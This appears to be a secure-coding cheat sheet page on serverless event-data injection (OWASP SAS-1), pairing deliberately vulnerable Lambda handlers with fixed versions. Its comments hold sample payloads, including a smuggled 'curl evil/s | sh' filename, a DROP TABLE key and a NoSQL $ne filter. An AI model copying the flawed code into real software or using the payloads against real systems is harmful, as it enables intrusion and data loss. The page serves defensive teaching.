@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SAS-1: Function Event-Data Injection - Quick Reference</title>
+    <link rel="stylesheet" href="../assets/cheat-sheet-style.css">
+    <style>
+        .back-nav {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--darker-color);
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 600;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            transform: translateX(-5px);
+            box-shadow: none;
+        }
+
+        @media print {
+            .back-nav { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="back-nav">
+        <a href="../index.html" class="back-btn">
+            <i class="fas fa-arrow-left"></i> Back to Cheat Sheets
+        </a>
+    </div>
+
+    <div class="cheat-sheet">
+        <!-- Header -->
+        <div class="header">
+            <h1>💉 Function Event-Data Injection</h1>
+            <p class="subtitle">OWASP Serverless Top 10 - SAS-1</p>
+            <span class="category">CRITICAL RISK</span>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content">
+            <!-- Overview Section -->
+            <div class="section full-width">
+                <h2>📋 What Is It?</h2>
+                <p><strong>Function Event-Data Injection</strong> is the serverless form of the classic injection flaw: untrusted data reaches an interpreter (SQL engine, shell, <code>eval</code>, XML parser, outbound HTTP client, or log sink) and is treated as instructions instead of data. What makes it distinct is <em>where the data comes from</em>. A web app takes input almost entirely through the HTTP request; a Lambda can be triggered by a dozen event sources — S3, SNS, SQS, DynamoDB Streams, EventBridge, SES, Kinesis, IoT — and every field of every event can carry attacker-influenced data. The core mistake is treating the event object as trusted platform plumbing. The platform <em>delivers</em> the event; it does not sanitise it.</p>
+
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <span class="value">SAS-1</span>
+                        <span class="label">OWASP Rank</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="value">12+</span>
+                        <span class="label">Event Sources</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="value">RCE</span>
+                        <span class="label">Worst Case</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Common Exploit Patterns -->
+            <div class="section">
+                <h2>⚠️ Common Exploits</h2>
+                <ul>
+                    <li><strong>SQL / NoSQL Injection:</strong> S3 key or message body concatenated into a query</li>
+                    <li><strong>Command Injection:</strong> filename/subject passed to <code>exec</code>, <code>os.system</code>, spawned CLI</li>
+                    <li><strong>Code Injection:</strong> <code>eval</code>, <code>Function()</code>, dynamic <code>require</code>/<code>import</code> of an event field</li>
+                    <li><strong>Path Traversal:</strong> S3 keys / attachment names building file paths (<code>../../</code>)</li>
+                    <li><strong>XXE:</strong> XML from an upload, queue body, or email parsed with entities enabled</li>
+                    <li><strong>SSRF:</strong> event URL fetched, reaching internal endpoints or the metadata service</li>
+                    <li><strong>Log Injection:</strong> newlines in event fields forging downstream log records</li>
+                </ul>
+            </div>
+
+            <!-- Attack Flow -->
+            <div class="section">
+                <h2>🔴 Attack Flow</h2>
+                <div class="attack-flow">
+1. Attacker shapes source data (upload, publish, write, email)<br>
+   <span class="arrow">↓</span><br>
+2. Platform wraps it in an event object (S3/SNS/DynamoDB record)<br>
+   <span class="arrow">↓</span><br>
+3. Handler reads a field and trusts it (key, body, attribute)<br>
+   <span class="arrow">↓</span><br>
+4. Field flows into an interpreter without safe construction<br>
+   <span class="arrow">↓</span><br>
+5. <strong>IMPACT: Injection fires with the function's IAM role attached!</strong>
+                </div>
+            </div>
+
+            <!-- Vulnerable Code Example -->
+            <div class="section full-width">
+                <h2>❌ Vulnerable Code</h2>
+                <div class="code-block vulnerable">
+<span class="comment"># Bad: SQL injection via an attacker-chosen S3 object key</span>
+<span class="keyword">def</span> <span class="function">handler</span>(event, context):
+    key = event[<span class="string">"Records"</span>][<span class="number">0</span>][<span class="string">"s3"</span>][<span class="string">"object"</span>][<span class="string">"key"</span>]
+    <span class="comment"># key = "r'); DROP TABLE files;--.pdf"</span>
+    cur.execute(<span class="string">"INSERT INTO files (name) VALUES ('"</span> + key + <span class="string">"')"</span>)  <span class="comment">← concatenation</span>
+
+<span class="comment">// Bad: OS command injection via an SNS message body</span>
+<span class="keyword">const</span> { exec } = <span class="function">require</span>(<span class="string">'child_process'</span>);
+exports.handler = <span class="keyword">async</span> (event) => {
+    <span class="keyword">const</span> name = event.Records[<span class="number">0</span>].Sns.Message;  <span class="comment">// "a.png; curl evil/s | sh"</span>
+    <span class="function">exec</span>(<span class="string">`convert /tmp/${name} /tmp/out.jpg`</span>);  <span class="comment">← shell parses metacharacters</span>
+};
+
+<span class="comment"># Bad: NoSQL operator injection via an SQS body</span>
+query = json.loads(event[<span class="string">"Records"</span>][<span class="number">0</span>][<span class="string">"body"</span>])  <span class="comment"># {"user":{"$ne":null}}</span>
+doc = db.users.find_one(query)  <span class="comment">← $ne matches the first admin</span>
+
+<span class="comment"># Bad: over-privileged role = full blast radius (serverless.yml)</span>
+provider:
+  iam:
+    role:
+      statements:
+        - Effect: Allow
+          Action: <span class="string">"*"</span>       <span class="comment">← every action...</span>
+          Resource: <span class="string">"*"</span>     <span class="comment">← ...on every resource</span>
+                </div>
+            </div>
+
+            <!-- Secure Code Example -->
+            <div class="section full-width">
+                <h2>✅ Secure Code</h2>
+                <div class="code-block secure">
+<span class="comment"># Good: validate the key against an allow-list, then parameterise</span>
+<span class="keyword">import</span> re
+KEY_RE = re.compile(<span class="string">r"^[A-Za-z0-9._/-]+$"</span>)
+
+<span class="keyword">def</span> <span class="function">handler</span>(event, context):
+    key = event[<span class="string">"Records"</span>][<span class="number">0</span>][<span class="string">"s3"</span>][<span class="string">"object"</span>][<span class="string">"key"</span>]
+    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(key, str) <span class="keyword">or</span> len(key) > <span class="number">512</span> <span class="keyword">or</span> <span class="keyword">not</span> KEY_RE.match(key):
+        <span class="keyword">raise</span> ValueError(<span class="string">"Invalid object key"</span>)
+    cur.execute(<span class="string">"INSERT INTO files (name) VALUES (%s)"</span>, (key,))  <span class="comment"># bound param</span>
+
+<span class="comment">// Good: no shell — args as an array, path contained</span>
+<span class="keyword">const</span> { execFile } = <span class="function">require</span>(<span class="string">'child_process'</span>);
+<span class="keyword">const</span> path = <span class="function">require</span>(<span class="string">'path'</span>);
+<span class="keyword">const</span> NAME_RE = <span class="string">/^[A-Za-z0-9._-]+$/</span>;
+exports.handler = <span class="keyword">async</span> (event) => {
+    <span class="keyword">const</span> name = event?.Records?.[<span class="number">0</span>]?.Sns?.Message;
+    <span class="keyword">if</span> (<span class="keyword">typeof</span> name !== <span class="string">'string'</span> || !NAME_RE.test(name)) <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">'bad name'</span>);
+    <span class="keyword">const</span> input = path.resolve(<span class="string">'/tmp'</span>, path.basename(name));  <span class="comment">// strips ../</span>
+    <span class="function">execFile</span>(<span class="string">'convert'</span>, [input, <span class="string">'/tmp/out.jpg'</span>], { timeout: <span class="number">10000</span> }, cb);
+};
+
+<span class="comment"># Good: extract coerced scalars — reject query operators</span>
+user_id = json.loads(body).get(<span class="string">"user"</span>)
+<span class="keyword">if</span> <span class="keyword">not</span> isinstance(user_id, str):
+    <span class="keyword">raise</span> ValueError(<span class="string">"Invalid user id"</span>)  <span class="comment"># {"$ne": None} is rejected</span>
+doc = db.users.find_one({<span class="string">"user"</span>: user_id})
+
+<span class="comment"># Good: per-function least-privilege role (serverless.yml)</span>
+functions:
+  indexUpload:
+    handler: src/s3.handler
+    iamRoleStatements:
+      - Effect: Allow
+        Action: [ <span class="string">"s3:GetObject"</span> ]
+        Resource: <span class="string">"arn:aws:s3:::uploads/*"</span>   <span class="comment"># one bucket, read only</span>
+                </div>
+            </div>
+
+            <!-- Prevention Checklist -->
+            <div class="section">
+                <h2>✓ Prevention Checklist</h2>
+                <ul class="checklist">
+                    <li>Validate every event against a strict per-source schema first</li>
+                    <li>Use positive allow-lists over deny-lists for field content</li>
+                    <li>Parameterise all SQL/NoSQL — never concatenate event fields</li>
+                    <li>Coerce scalars for NoSQL; reject raw JSON objects as filters</li>
+                    <li>Never <code>eval</code> / dynamic <code>require</code> / shell event data</li>
+                    <li>Pass CLI arguments as arrays; set <code>shell=False</code></li>
+                    <li>Canonicalise paths and confirm they stay in the base dir</li>
+                    <li>Allow-list outbound URLs; block link-local/metadata ranges</li>
+                    <li>Disable external entities on every XML parser</li>
+                    <li>Scope each function's execution role to least privilege</li>
+                    <li>Remember: a WAF never sees non-HTTP triggers</li>
+                    <li>Monitor injection signatures across all event sources</li>
+                </ul>
+            </div>
+
+            <!-- Detection & Tools -->
+            <div class="section">
+                <h2>🔍 Detection & Tools</h2>
+                <h3>Validation & Safe APIs:</h3>
+                <div class="tools-list">
+                    <span class="tool-tag">ajv (JSON Schema)</span>
+                    <span class="tool-tag">Pydantic</span>
+                    <span class="tool-tag">defusedxml</span>
+                    <span class="tool-tag">fast-xml-parser</span>
+                    <span class="tool-tag">Parameterised drivers</span>
+                </div>
+
+                <h3>Scanning & Runtime:</h3>
+                <div class="tools-list">
+                    <span class="tool-tag">Snyk</span>
+                    <span class="tool-tag">Checkov</span>
+                    <span class="tool-tag">Semgrep</span>
+                    <span class="tool-tag">Prisma Cloud (PureSec)</span>
+                    <span class="tool-tag">CloudWatch</span>
+                    <span class="tool-tag">CloudTrail</span>
+                    <span class="tool-tag">AWS X-Ray</span>
+                </div>
+
+                <h3>How to Test:</h3>
+                <ul>
+                    <li>Map every trigger that invokes the function, not just HTTP</li>
+                    <li>Upload objects with crafted keys (quotes, <code>;</code>, <code>../</code>)</li>
+                    <li>Publish messages / write rows carrying injection payloads</li>
+                    <li>Send inbound email with payloads in subject and attachment names</li>
+                    <li>Check whether event fields reach a sink without validation</li>
+                    <li>Watch for outbound calls to <code>169.254.169.254</code></li>
+                </ul>
+            </div>
+
+            <!-- Real-World Examples -->
+            <div class="section full-width">
+                <h2>🌍 Real-World</h2>
+                <p>These are documented <strong>incident classes</strong> — recurring architectural patterns, not specific CVEs.</p>
+                <ul>
+                    <li><strong>Trusting the upload pipeline:</strong> HTTP upload endpoint is hardened, but the S3 <code>ObjectCreated</code> processor behind it trusts the attacker-chosen object key in a shell or SQL sink.</li>
+                    <li><strong>Poisoned asynchronous messages:</strong> a public producer feeds SNS/SQS/Kinesis; the consumer interpolates the body — executing off the HTTP path with no request in the logs to correlate.</li>
+                    <li><strong>Stream and table injection:</strong> any code path that writes to a DynamoDB table becomes an injection vector for the stream consumer's downstream query.</li>
+                    <li><strong>Inbound email as an injection channel:</strong> SES delivers fully attacker-controlled subject/headers/attachment names into queries, commands, or XML parsers.</li>
+                    <li><strong>SSRF to metadata theft:</strong> an event URL field fetched by the function reaches <code>169.254.169.254</code> and lifts the execution role's temporary credentials.</li>
+                </ul>
+            </div>
+
+            <!-- Quick Reference -->
+            <div class="section">
+                <h2>📌 Quick Tips</h2>
+                <ul>
+                    <li><span class="badge critical">DO NOT</span> trust the event because "it came from AWS"</li>
+                    <li><span class="badge critical">DO NOT</span> concatenate event fields into queries or commands</li>
+                    <li><span class="badge critical">DO NOT</span> <code>eval</code> or dynamically require event data</li>
+                    <li><span class="badge high">DO</span> validate every event against a strict schema</li>
+                    <li><span class="badge high">DO</span> parameterise and use safe, structured APIs</li>
+                    <li><span class="badge high">DO</span> scope the execution role to least privilege</li>
+                    <li><span class="badge medium">DO</span> monitor all triggers, not just HTTP</li>
+                </ul>
+            </div>
+
+            <!-- Compliance -->
+            <div class="section">
+                <h2>📜 Compliance</h2>
+                <p><strong>Related Standards:</strong></p>
+                <ul>
+                    <li><span class="badge medium">OWASP</span> Serverless Top 10 - SAS-1</li>
+                    <li><span class="badge medium">CWE-89</span> SQL Injection</li>
+                    <li><span class="badge medium">CWE-78</span> OS Command Injection</li>
+                    <li><span class="badge medium">CWE-94</span> Code Injection</li>
+                    <li><span class="badge medium">CWE-611</span> XML External Entity (XXE)</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p><strong>OWASP Serverless Top 10 — Educational Platform</strong> | <a href="../index.html">All Cheat Sheets</a> | <a href="/">Home</a></p>
+            <p>Full lesson: <a href="/labs/serverless/OWASP-Serverless/SAS01-Function-Event-Data-Injection/overview.html">Read the deep dive →</a></p>
+            <p>📥 To download as PDF: Print this page (Ctrl+P) → Save as PDF</p>
+        </div>
+    </div>
+</body>
+</html>
